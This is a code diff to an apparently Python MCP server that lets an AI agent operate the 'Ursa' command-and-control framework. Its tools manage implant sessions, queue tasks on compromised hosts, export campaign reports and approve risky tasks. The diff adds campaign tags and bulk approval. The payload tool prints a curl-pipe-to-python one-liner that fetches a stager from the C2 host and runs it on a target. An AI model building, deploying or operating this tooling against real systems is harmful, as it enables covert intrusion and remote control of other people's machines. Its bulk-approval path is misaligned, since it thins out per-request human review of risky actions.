@@ -11,6 +11,7 @@ Tools:
     Sessions:
         - ursa_sessions      — List all active/stale/dead sessions
         - ursa_session_info  — Get detailed info on a session
+        - ursa_set_session_context — Set campaign/tags on a session
         - ursa_kill_session  — Kill a session
 
     Tasking:
@@ -29,6 +30,11 @@ Tools:
         - ursa_stop_c2       — Stop the C2 server
         - ursa_c2_status     — Check if C2 is running
         - ursa_events        — View C2 event log
+        - ursa_approvals     — View pending/approved/rejected approvals
+        - ursa_approve       — Approve one request
+        - ursa_reject        — Reject one request
+        - ursa_approve_campaign — Bulk-approve requests by campaign/tag
+        - ursa_reject_campaign — Bulk-reject requests by campaign/tag
 
     Payload Generation:
         - ursa_generate      — Generate a beacon payload
@@ -38,13 +44,14 @@ Run with:
     /path/to/ursa/venv/bin/python3 server.py
 """
 
-import sys
-import os
+import base64
+import csv
 import json
-import time
+import os
 import signal
 import subprocess
-import base64
+import sys
+import time
 from datetime import datetime
 from pathlib import Path
 
@@ -54,16 +61,25 @@ from mcp.server.fastmcp import FastMCP
 PROJECT_ROOT = Path(__file__).parent
 sys.path.insert(0, str(PROJECT_ROOT))
 
-from major.db import (
-    get_session, list_sessions, kill_session, get_task, list_tasks,
-    list_files, get_events,
-    get_approval_request, list_approval_requests, resolve_approval_request,
-    append_immutable_audit_event, get_immutable_audit, verify_immutable_audit_chain,
+from major.db import (  # noqa: E402
+    get_events,
+    get_immutable_audit,
+    get_session,
+    get_task,
+    kill_session,
+    list_approval_requests,
+    list_files,
+    list_sessions,
+    list_tasks,
+    update_session_info,
+    verify_immutable_audit_chain,
 )
-from major.governance import (
-    queue_task_with_policy,
+from major.governance import (  # noqa: E402
     format_risk_matrix,
     normalize_args_string,
+    process_approval_decision,
+    process_bulk_approval_decisions,
+    queue_task_with_policy,
 )
 
 mcp_server = FastMCP(
@@ -204,33 +220,61 @@ def ursa_c2_status() -> str:
 
 
 @mcp_server.tool()
-def ursa_sessions(status: str | None = None) -> str:
+def ursa_sessions(
+    status: str | None = None,
+    campaign: str | None = None,
+    tag: str | None = None,
+) -> str:
     """
     List all implant sessions.
 
     Args:
         status: Filter by status — "active", "stale", or "dead".
-                Shows all if not specified.
+        campaign: Filter by campaign name.
+        tag: Filter by tag substring.
     """
-    sessions = list_sessions(status=status)
+    sessions = list_sessions(status=status, campaign=campaign, tag=tag)
 
     if not sessions:
         return f"No {'sessions' if not status else status + ' sessions'} found."
 
     lines = [
-        f"{'ID':<10} {'User@Host':<30} {'IP':<18} {'OS':<20} {'Last Seen':<12} {'Status'}",
-        "-" * 100,
+        f"{'ID':<10} {'User@Host':<26} {'Campaign':<14} {'Tags':<18} {'Last Seen':<12} {'Status'}",
+        "-" * 110,
     ]
 
     for s in sessions:
         user_host = f"{s['username']}@{s['hostname']}"
+        campaign_name = s.get("campaign") or "-"
+        tags = s.get("tags") or "-"
         lines.append(
-            f"{s['id']:<10} {user_host:<30} {s['remote_ip']:<18} "
-            f"{s['os'][:20]:<20} {_time_ago(s['last_seen']):<12} {s['status']}"
+            f"{s['id']:<10} {user_host[:26]:<26} {campaign_name[:14]:<14} {tags[:18]:<18} "
+            f"{_time_ago(s['last_seen']):<12} {s['status']}"
         )
 
     lines.append(f"\n{len(sessions)} sessions total")
     return "\n".join(lines)
+
+
+@mcp_server.tool()
+def ursa_set_session_context(session_id: str, campaign: str = "", tags: str = "") -> str:
+    """
+    Set campaign and tags for a session to support grouping/organization.
+
+    Args:
+        session_id: Target session ID.
+        campaign: Campaign/group name.
+        tags: Comma-separated tags (e.g., "finance,dc1,high-value").
+    """
+    s = get_session(session_id)
+    if not s:
+        return f"Session {session_id} not found."
+    update_session_info(session_id, campaign=campaign.strip(), tags=tags.strip())
+    return (
+        f"Session {session_id} updated.\n"
+        f"Campaign: {campaign.strip() or '-'}\n"
+        f"Tags: {tags.strip() or '-'}"
+    )
 
 
 @mcp_server.tool()
@@ -259,6 +303,8 @@ def ursa_session_info(session_id: str) -> str:
         f"  Arch:        {s['arch']}",
         f"  PID:         {s['pid']}",
         f"  Process:     {s['process_name']}",
+        f"  Campaign:    {s.get('campaign') or '-'}",
+        f"  Tags:        {s.get('tags') or '-'}",
         f"  First seen:  {_format_time(s['first_seen'])}",
         f"  Last seen:   {_format_time(s['last_seen'])} ({_time_ago(s['last_seen'])})",
         f"  Interval:    {s['beacon_interval']}s (jitter: {s['jitter']})",
@@ -436,28 +482,42 @@ def ursa_task_result(task_id: str) -> str:
 
 
 @mcp_server.tool()
-def ursa_tasks(session_id: str | None = None, status: str | None = None, limit: int = 20) -> str:
+def ursa_tasks(
+    session_id: str | None = None,
+    status: str | None = None,
+    campaign: str | None = None,
+    tag: str | None = None,
+    limit: int = 20,
+) -> str:
     """
     List tasks, optionally filtered by session and/or status.
 
     Args:
         session_id: Filter to a specific session
         status: Filter by status — "pending", "in_progress", "completed", "error"
+        campaign: Filter by campaign name
+        tag: Filter by tag substring
         limit: Max tasks to return (default 20)
     """
-    tasks = list_tasks(session_id=session_id, status=status, limit=limit)
+    tasks = list_tasks(
+        session_id=session_id,
+        status=status,
+        campaign=campaign,
+        tag=tag,
+        limit=limit,
+    )
 
     if not tasks:
         return "No tasks found."
 
     lines = [
-        f"{'ID':<10} {'Session':<10} {'Type':<12} {'Status':<12} {'Created'}",
-        "-" * 65,
+        f"{'ID':<10} {'Session':<10} {'Campaign':<14} {'Type':<12} {'Status':<12} {'Created'}",
+        "-" * 85,
     ]
 
     for t in tasks:
         lines.append(
-            f"{t['id']:<10} {t['session_id']:<10} {t['task_type']:<12} "
+            f"{t['id']:<10} {t['session_id']:<10} {(t.get('campaign') or '-')[:14]:<14} {t['task_type']:<12} "
             f"{t['status']:<12} {_time_ago(t['created_at'])}"
         )
 
@@ -572,15 +632,22 @@ def ursa_files(session_id: str | None = None) -> str:
 
 
 @mcp_server.tool()
-def ursa_events(limit: int = 30, level: str | None = None) -> str:
+def ursa_events(
+    limit: int = 30,
+    level: str | None = None,
+    campaign: str | None = None,
+    tag: str | None = None,
+) -> str:
     """
     View the C2 event log.
 
     Args:
         limit: Number of events to show (default 30)
         level: Filter by level — "info", "warning", "error"
+        campaign: Filter by campaign name
+        tag: Filter by tag substring
     """
-    events = get_events(limit=limit, level=level)
+    events = get_events(limit=limit, level=level, campaign=campaign, tag=tag)
 
     if not events:
         return "No events."
@@ -589,9 +656,106 @@ def ursa_events(limit: int = 30, level: str | None = None) -> str:
     for e in events:
         ts = datetime.fromtimestamp(e["timestamp"]).strftime("%H:%M:%S")
         sid = f" [{e['session_id']}]" if e.get("session_id") else ""
-        lines.append(f"[{ts}] {e['level'].upper():<7} {e['source']}{sid}: {e['message']}")
+        camp = f" ({e['campaign']})" if e.get("campaign") else ""
+        lines.append(f"[{ts}] {e['level'].upper():<7} {e['source']}{sid}{camp}: {e['message']}")
 
     return "\n".join(lines)
+
+
+@mcp_server.tool()
+def ursa_campaigns() -> str:
+    """Summarize session/task/event activity by campaign."""
+    sessions = list_sessions()
+    tasks = list_tasks(limit=1000)
+    events = get_events(limit=1000)
+
+    campaigns: dict[str, dict[str, int]] = {}
+    for s in sessions:
+        name = (s.get("campaign") or "unassigned").strip() or "unassigned"
+        campaigns.setdefault(name, {"sessions": 0, "tasks": 0, "events": 0})
+        campaigns[name]["sessions"] += 1
+    for t in tasks:
+        name = (t.get("campaign") or "unassigned").strip() or "unassigned"
+        campaigns.setdefault(name, {"sessions": 0, "tasks": 0, "events": 0})
+        campaigns[name]["tasks"] += 1
+    for e in events:
+        name = (e.get("campaign") or "unassigned").strip() or "unassigned"
+        campaigns.setdefault(name, {"sessions": 0, "tasks": 0, "events": 0})
+        campaigns[name]["events"] += 1
+
+    if not campaigns:
+        return "No campaign activity found."
+
+    lines = [
+        f"{'Campaign':<20} {'Sessions':<10} {'Tasks':<10} {'Events'}",
+        "-" * 56,
+    ]
+    for name, counts in sorted(campaigns.items(), key=lambda item: item[0]):
+        lines.append(
+            f"{name[:20]:<20} {counts['sessions']:<10} {counts['tasks']:<10} {counts['events']}"
+        )
+    return "\n".join(lines)
+
+
+@mcp_server.tool()
+def ursa_campaign_report(campaign: str, output_format: str = "json") -> str:
+    """
+    Export a campaign report to disk.
+
+    Args:
+        campaign: Campaign name to export.
+        output_format: "json" or "csv".
+    """
+    campaign_name = campaign.strip()
+    if not campaign_name:
+        return "Campaign is required."
+    fmt = output_format.strip().lower()
+    if fmt not in {"json", "csv"}:
+        return "output_format must be 'json' or 'csv'."
+
+    sessions = list_sessions(campaign=campaign_name)
+    tasks = list_tasks(campaign=campaign_name, limit=5000)
+    events = get_events(campaign=campaign_name, limit=5000)
+
+    reports_dir = PROJECT_ROOT / "reports"
+    reports_dir.mkdir(parents=True, exist_ok=True)
+    safe_name = "".join(ch if ch.isalnum() or ch in "-_." else "_" for ch in campaign_name)
+    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+
+    if fmt == "json":
+        report = {
+            "campaign": campaign_name,
+            "generated_at": datetime.now().isoformat(),
+            "counts": {
+                "sessions": len(sessions),
+                "tasks": len(tasks),
+                "events": len(events),
+            },
+            "sessions": sessions,
+            "tasks": tasks,
+            "events": events,
+        }
+        out_path = reports_dir / f"campaign_{safe_name}_{ts}.json"
+        with open(out_path, "w", encoding="utf-8") as f:
+            json.dump(report, f, indent=2)
+    else:
+        out_path = reports_dir / f"campaign_{safe_name}_{ts}.csv"
+        with open(out_path, "w", newline="", encoding="utf-8") as f:
+            writer = csv.writer(f)
+            writer.writerow(["section", "id", "session_id", "type", "status_or_level", "message"])
+            for s in sessions:
+                writer.writerow(["session", s["id"], s["id"], "session", s.get("status", ""), s.get("hostname", "")])
+            for t in tasks:
+                writer.writerow(["task", t["id"], t.get("session_id", ""), t.get("task_type", ""), t.get("status", ""), ""])
+            for e in events:
+                writer.writerow(["event", e["id"], e.get("session_id", ""), e.get("source", ""), e.get("level", ""), e.get("message", "")])
+
+    return (
+        f"Campaign report exported.\n"
+        f"Campaign: {campaign_name}\n"
+        f"Format: {fmt}\n"
+        f"Path: {out_path}"
+    )
 
 
 # ── Governance ──
@@ -604,25 +768,32 @@ def ursa_policy_matrix() -> str:
 
 
 @mcp_server.tool()
-def ursa_approvals(status: str = "pending", limit: int = 20) -> str:
+def ursa_approvals(
+    status: str = "pending",
+    campaign: str | None = None,
+    tag: str | None = None,
+    limit: int = 20,
+) -> str:
     """
     List governance step-up approval requests.
 
     Args:
         status: Filter by status ("pending", "approved", "rejected")
+        campaign: Filter by campaign name
+        tag: Filter by tag substring
         limit: Max rows to return
     """
-    rows = list_approval_requests(status=status, limit=limit)
+    rows = list_approval_requests(status=status, campaign=campaign, tag=tag, limit=limit)
     if not rows:
         return f"No {status} approvals."
 
     lines = [
-        f"{'ID':<10} {'Risk':<10} {'Action':<12} {'Session':<10} {'By':<20} {'Age'}",
-        "-" * 85,
+        f"{'ID':<10} {'Risk':<10} {'Campaign':<14} {'Action':<12} {'Session':<10} {'By':<20} {'Age'}",
+        "-" * 100,
     ]
     for row in rows:
         lines.append(
-            f"{row['id']:<10} {row['risk_level']:<10} {row['action']:<12} "
+            f"{row['id']:<10} {row['risk_level']:<10} {(row.get('campaign') or '-')[:14]:<14} {row['action']:<12} "
             f"{(row.get('session_id') or '-'): <10} {row['requested_by']:<20} "
             f"{_time_ago(row['created_at'])}"
         )
@@ -638,35 +809,21 @@ def ursa_approve(approval_id: str, note: str = "") -> str:
         approval_id: Approval request ID
         note: Optional decision note
     """
-    req = get_approval_request(approval_id)
-    if not req:
+    result = process_approval_decision(
+        approval_id=approval_id,
+        approved=True,
+        actor="mcp:ursa_approve",
+        note=note,
+    )
+    if result["status"] == "not_found":
         return f"Approval {approval_id} not found."
-    if req["status"] != "pending":
-        return f"Approval {approval_id} is already {req['status']}."
-
-    if not resolve_approval_request(approval_id, approved=True, decided_by="mcp:operator", note=note):
+    if result["status"] == "already_resolved":
+        return f"Approval {approval_id} is already {result.get('current_status', 'resolved')}."
+    if result["status"] == "error":
         return f"Approval {approval_id} could not be updated."
-
-    args = json.loads(req.get("args") or "{}")
-    decision = queue_task_with_policy(
-        session_id=req["session_id"],
-        task_type=req.get("task_type") or "shell",
-        args=args,
-        actor="mcp:ursa_approve",
-        approval_id=approval_id,
-    )
-    append_immutable_audit_event(
-        actor="mcp:ursa_approve",
-        action="approval_decision",
-        session_id=req.get("session_id"),
-        approval_id=approval_id,
-        risk_level=req.get("risk_level", "unknown"),
-        policy_result="approved",
-        details={"note": note},
-    )
-    if decision["status"] != "queued":
-        return f"Approval {approval_id} recorded, but task was not queued: {decision['message']}"
-    return f"Approval {approval_id} approved. Task queued: {decision['task_id']}"
+    if result.get("queue_result") != "queued":
+        return f"Approval {approval_id} recorded, but task was not queued."
+    return f"Approval {approval_id} approved. Task queued: {result.get('task_id')}"
 
 
 @mcp_server.tool()
@@ -678,24 +835,73 @@ def ursa_reject(approval_id: str, note: str = "") -> str:
         approval_id: Approval request ID
         note: Optional reason for rejection
     """
-    req = get_approval_request(approval_id)
-    if not req:
-        return f"Approval {approval_id} not found."
-    if req["status"] != "pending":
-        return f"Approval {approval_id} is already {req['status']}."
-
-    if not resolve_approval_request(approval_id, approved=False, decided_by="mcp:operator", note=note):
-        return f"Approval {approval_id} could not be updated."
-    append_immutable_audit_event(
-        actor="mcp:ursa_reject",
-        action="approval_decision",
-        session_id=req.get("session_id"),
+    result = process_approval_decision(
         approval_id=approval_id,
-        risk_level=req.get("risk_level", "unknown"),
-        policy_result="rejected",
-        details={"note": note},
+        approved=False,
+        actor="mcp:ursa_reject",
+        note=note,
     )
+    if result["status"] == "not_found":
+        return f"Approval {approval_id} not found."
+    if result["status"] == "already_resolved":
+        return f"Approval {approval_id} is already {result.get('current_status', 'resolved')}."
+    if result["status"] == "error":
+        return f"Approval {approval_id} could not be updated."
     return f"Approval {approval_id} rejected."
+
+
+@mcp_server.tool()
+def ursa_approve_campaign(campaign: str, tag: str | None = None, note: str = "") -> str:
+    """
+    Approve all pending requests for a campaign/tag filter.
+
+    Args:
+        campaign: Campaign name to filter.
+        tag: Optional tag filter.
+        note: Optional audit note.
+    """
+    summary = process_bulk_approval_decisions(
+        approved=True,
+        actor="mcp:ursa_approve_campaign",
+        note=note,
+        campaign=campaign.strip() or None,
+        tag=(tag or "").strip() or None,
+        limit=500,
+    )
+    return (
+        f"Bulk approve complete.\n"
+        f"Matched: {summary['matched']}\n"
+        f"Approved: {summary['approved']}\n"
+        f"Failed: {summary['failed']}\n"
+        f"Already resolved: {summary['already_resolved']}"
+    )
+
+
+@mcp_server.tool()
+def ursa_reject_campaign(campaign: str, tag: str | None = None, note: str = "") -> str:
+    """
+    Reject all pending requests for a campaign/tag filter.
+
+    Args:
+        campaign: Campaign name to filter.
+        tag: Optional tag filter.
+        note: Optional audit note.
+    """
+    summary = process_bulk_approval_decisions(
+        approved=False,
+        actor="mcp:ursa_reject_campaign",
+        note=note,
+        campaign=campaign.strip() or None,
+        tag=(tag or "").strip() or None,
+        limit=500,
+    )
+    return (
+        f"Bulk reject complete.\n"
+        f"Matched: {summary['matched']}\n"
+        f"Rejected: {summary['rejected']}\n"
+        f"Failed: {summary['failed']}\n"
+        f"Already resolved: {summary['already_resolved']}"
+    )
 
 
 @mcp_server.tool()
@@ -765,23 +971,20 @@ def ursa_generate(
     if not beacon_path.exists():
         return "Beacon source not found at implants/beacon.py"
 
-    with open(beacon_path) as f:
-        beacon_src = f.read()
-
     lines = [
-        f"Ursa Beacon Payload Generated",
+        "Ursa Beacon Payload Generated",
         f"C2:       {c2_url}",
         f"Interval: {interval}s",
         f"Jitter:   {jitter}",
         "",
-        f"Deploy command:",
+        "Deploy command:",
         f"  python3 beacon.py --server {c2_url} --interval {interval} --jitter {jitter}",
         "",
-        f"One-liner (curl + exec):",
+        "One-liner (curl + exec):",
         f"  curl -s {c2_url}/stage | python3 - --server {c2_url}",
         "",
         f"Beacon source is at: {beacon_path}",
-        f"Copy it to the target and run with the deploy command above.",
+        "Copy it to the target and run with the deploy command above.",
     ]
 
     return "\n".join(lines)
